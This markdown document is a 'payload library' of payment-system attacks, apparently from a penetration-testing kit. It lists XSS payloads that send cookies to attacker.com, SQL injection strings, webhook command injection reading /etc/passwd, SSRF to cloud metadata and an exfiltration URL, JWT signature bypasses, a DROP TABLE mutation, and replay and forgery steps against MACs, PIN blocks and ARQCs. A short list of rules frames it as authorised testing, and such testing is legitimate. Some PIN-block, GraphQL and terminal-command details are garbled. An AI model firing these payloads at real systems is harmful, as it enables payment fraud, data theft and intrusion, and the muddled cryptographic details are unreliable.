# PAYLOAD LIBRARY — Payment Attack Weaponry

## Overview

Every payload in this library is tested, documented, and ready to fire. Payloads are organized by attack category and target type. Each payload includes target conditions, execution notes, and expected behavior.


---

## Payload Categories

```
1. ISO8583 — Protocol message injection, fuzzing, MAC attacks
2. Web — XSS, SQLi, command injection, SSRF, GraphQL
3. API — REST fuzzing, authentication bypass, webhook replay
4. HSM — PIN block manipulation, MAC forgery, key extraction
5. POS — SPDH multicall, terminal commands, XFlow
6. Checkout — Price manipulation, token theft, business logic
```

---

## ISO8583 Payloads

### Message Type Indicators (MTI)

| MTI | Name | Use | Risk |
|---|---|---|---|
| 0100 | Authorization Request | Test card transactions | HIGH |
| 0110 | Authorization Response | Modify responses | CRITICAL |
| 0120 | Authorization Advice | Modify captured txns | HIGH |
| 0130 | Authorization Reversal | Void transactions | CRITICAL |
| 0200 | Financial Transaction Request | Direct payment | CRITICAL |
| 0210 | Financial Transaction Response | Modify responses | CRITICAL |
| 0220 | Financial Advice | Modify txn advice | HIGH |
| 0230 | Financial Reversal | Reverse completed txns | CRITICAL |
| 0400 | Network Management Request | Key exchange, echo | MEDIUM |
| 0800 | Network Management | Zone key injection | HIGH |
| 0810 | Network Management Response | Key exchange response | MEDIUM |

### Field Manipulation Payloads

**PAN Overflow**
```
MTI: 0100
PAN: 411111111111111199999999 (20 digits — overflow)
Amount: 000000000100
```
Test: Card number field length validation

**Negative Amount**
```
MTI: 0100
PAN: 4111111111111111
Amount: -00000000100 (negative — invalid)
```
Test: Amount validation, integer overflow

**MALFORMED MTI**
```
MTI: 9999
PAN: 4111111111111111
Amount: 000000000100
```
Test: MTI parsing, error handling

**Missing Mandatory Field**
```
MTI: 0100
PAN: 4111111111111111
(field 3 processing code omitted)
```
Test: Required field validation

**Extended PAN (19+ digits)**
```
MTI: 0100
PAN: 4111111111111111119 (19 digits)
```
Test: PAN length handling

### MAC Bypass Payloads

**MAC Replay**
```
Same transaction sent twice with valid MAC from first attempt
```
Test: MAC uniqueness enforcement

**Zero MAC**
```
MTI: 0100
PAN: 4111111111111111
Field 64 (MAC): 0000000000000000
```
Test: MAC required validation

**MAC Forgery (known key)**
```
If master key compromised:
Generate valid MAC for arbitrary message
MAC = DES(key, message)
```
Test: MAC generation/verification

### ARQC/ARPC Payloads

**ARQC Replay**
```
Capture valid ARQC from live transaction
Replay in new transaction with modified amount
ARQC = ARPC generation function(PAN, ATC, UN, amount)
```
Test: ARQC uniqueness, replay protection

**ARPC Manipulation**
```
Modify response code in ARPC calculation
ARPC = 3DES(key, data || response_code || 80 padding)
```
Test: ARPC verification bounds

### PIN Block Payloads

**Format 0 (ISO9564-1)**
```
PIN Block = 04 + PIN[4] + PAN[rest]
PIN: "1234" → 41234 + PAN suffix
```
Test: PIN block format validation

**Format 1 (IBM3624)**
```
PIN Block = 04 + PIN + PAN offset
```
Test: Alternative PIN block formats

**PIN Extraction Attempt**
```
If PIN block captured:
Brute force 4-digit PIN from block
Block = E(PIN[4] || zeros) XOR PAN
```
Test: PIN block encryption

---

## Web Payloads

### XSS — Payment Fields

**Cardholder Name Injection**
```
Name: <script>fetch('https://attacker.com?c='+document.cookie)</script>
```
Test: Stored XSS in receipt/confirmation email

**Address Field Injection**
```
Address1: <img src=x onerror=fetch('https://attacker.com?d=1')>
```
Test: Stored XSS in address handling

**Note Field Injection**
```
Order notes: "><script>document.location='https://attacker.com?x='+btoa(document.cookie)</script>
```
Test: Reflected/stored XSS in notes

### SQL Injection — Transaction IDs

**Union-Based**
```
transaction_id: 1' UNION SELECT NULL,version(),user(),@@datadir--
```
Test: SQLi in transaction lookup

**Boolean-Based**
```
transaction_id: 1' AND 1=1--
(transaction returns normally)
transaction_id: 1' AND 1=2--
(transaction returns error or empty)
```
Test: Boolean blind SQLi

**Time-Based**
```
transaction_id: 1' AND SLEEP(5)--
```
Test: Time-based blind SQLi

### Command Injection — Webhooks

**Callback URL Injection**
```
callback_url: https://attacker.com;cat /etc/passwd
```
Test: OS command injection in webhook URL

**Parameter Injection**
```
?tx_id=123&dest=https://attacker.com$(whoami)
```
Test: Command injection in parameter parsing

### SSRF — Webhook Endpoints

**Internal Service Scan**
```
webhook_url: http://169.254.169.254/latest/meta-data/ (AWS metadata)
webhook_url: http://localhost:7001/admin (internal admin)
webhook_url: http://internal-db:5432 (database)
```
Test: SSRF to internal services

**Data Exfiltration via SSRF**
```
webhook_url: http://attacker.com/exfil?data=$(internal_secret)
```
Test: Data theft via SSRF

### GraphQL Payloads

**Introspection Query**
```graphql
{__schema{types{name kind description fields{name type}}}}
```
Test: Schema discovery

**Union Injection**
```graphql
{__typename} // Returns type name for union resolution
```
Test: Union type exploitation

**Mutation Injection**
```graphql
mutation {createPaymentMethod(token:"';DROP TABLE payments;--"){id}}
```
Test: GraphQL mutation injection

---

## API Payloads

### Authentication Bypass

**JWT Algorithm Confusion**
```
Alg: "RS256" → "HS256"
Use public key as HMAC secret
```
Test: JWT signature bypass

**JWT None Algorithm**
```
Alg: "none"
Payload: {"sub":"admin","role":"admin"}
```
Test: Algorithm "none" support

**Token Expiration Abuse**
```
exp: 9999999999 (far future)
```
Test: Token expiration validation

### REST Fuzzing

**Parameter Pollution**
```
amount=100&amount=0 (duplicate parameter)
```
Test: Parameter parsing vulnerabilities

**Type Coercion**
```
amount: "100.00" vs 100 vs "0x64"
```
Test: Type handling in amount validation

**Null Injection**
```
card_token: null
amount: null
```
Test: Null value handling

### Webhook Exploitation

**Webhook Replay**
```
Same webhook POST sent multiple times
Check for idempotency enforcement
```
Test: Webhook replay protection

**Signature Stripping**
```
Remove X-Webhook-Signature header
Send payload without signature
```
Test: Webhook signature enforcement

**Timestamp Manipulation**
```
X-Webhook-Timestamp: 1234567890 (old timestamp)
```
Test: Webhook timestamp validation

---

## HSM Payloads

### Key Extraction

**Lazy Key Loading**
```
Send key request without proper authentication
Observe if HSM returns key material
```
Test: Key access control

**Key Derivation Test**
```
Master Key: MK
Derived Key: ZMK = 3DES(MK, "default key")
Test with known ZMK derivation
```
Test: Key derivation process

### PIN Operations

**PIN Verification Bypass**
```
Generate PIN block for known PIN
Test against captured blocks
```
Test: PIN verification strength

**PIN Block Format Attack**
```
ISO9564-1 Format 0: 04 + PIN + PAN
Modify PAN suffix in block
Re-encrypt and test
```
Test: PIN block format validation

### MAC Operations

**MAC Generation Request**
```
Request MAC for arbitrary message
Test key usage restrictions
```
Test: MAC generation authorization

**MAC Forgery**
```
Known plaintext + known MAC → forge new MAC
```
Test: MAC algorithm strength

---

## POS Payloads (SPDH/HPDH)

### Multicall Exploitation

**Credential Enumeration**
```
SPDH: MULTICALL with sequential card numbers
Test for account lockout thresholds
```
Test: SPDH rate limiting

**Amount Manipulation**
```
SPDH: Modify amount field in transaction
Observe if signature verification uses original or modified amount
```
Test: SPDH integrity

### XFlow Commands

**Remote Status Query**
```
XFlow: STATUS command
Query terminal state, firmware version, encryption status
```
Test: XFlow command authorization

**Configuration Dump**
```
XFlow: DUMP_CONFIG command
Extract full terminal configuration
```
Test: XFlow access control

**Key Injection**
```
XFlow: INJECT_KEY command
Test if remote key injection is authorized
```
Test: XFlow key injection protection

---

## Checkout Payloads

### Price Manipulation

**Negative Price**
```
amount: -100
currency: USD
```
Test: Amount validation, integer overflow

**Integer Overflow**
```
amount: 9999999999999 (overflow to negative)
```
Test: Amount overflow protection

**Currency Swap**
```
amount: "100.00"
currency_code: "EUR" → "USD"
Observe if amount recalculates
```
Test: Currency handling

**Decimal Precision Attack**
```
amount: 0.01 (minimum charge)
quantity: 9999
```
Test: Total calculation validation

### Token Manipulation

**Token Reuse**
```
Use token from one merchant on another merchant's checkout
Test for merchant scoping
```
Test: Token scoping

**Token Escalation**
```
Standard payment token → admin token
Upgrade token privileges
```
Test: Token privilege escalation

### Race Conditions

**Concurrent Authorization**
```
Send 5 identical transactions simultaneously
Check for duplicate capture or race window
```
Test: Race condition protection

**State Manipulation**
```
Capture transaction in "pending" state
Modify to "completed" without proper authorization
```
Test: State transition validation

---

## Payload Testing Rules

1. **Always** verify target in engagement_config.json
2. **Always** document every payload test with timestamp
3. **Never** test with real card numbers — use test BINs only
4. **Always** capture full response for every payload
5. **Never** leave test artifacts (uploaded files, test accounts)
6. **Always** preserve evidence: screenshots, PCAP, response data
7. **Stop** immediately if honeypot detected
8. **Report** every result to knowledge/gateway_profiles/<target>/

---

## Payload Template

For new payloads, document:

```yaml
payload:
  name: <descriptive_name>
  category: <iso8583|web|api|hsm|pos|checkout>
  target: <target_domain>
  payload: |
    <actual payload string>

  conditions:
    - Target must have: <requirement>
    - Environment: <test/production>

  expected:
    success: <what success looks like>
    failure: <what failure looks like>

  risk:
    severity: <CRITICAL|HIGH|MEDIUM|LOW>
    detection_risk: <HIGH|MEDIUM|LOW>
    reversibility: <YES|NO|PARTIAL>

  testing_notes: |
    <how to test, variations to try>

  evidence:
    - screenshot
    - pcap
    - response_log
```

---

## Payload Index

| Category | File/Location | Count |
|---|---|---|
| ISO8583 | neopay/scripts/ | 15 scripts |
| Web | neopay/scripts/ | fuzzing + web attack scripts |
| Protocol | neopay/references/ | iso8583, hsm, pos_protocols |
| Test Data | neopay/assets/test_data/ | card ranges, payloads |
| Kubernetes | neopay/assets/kubernetes/ | attack manifests |

See individual directories for full payload listings.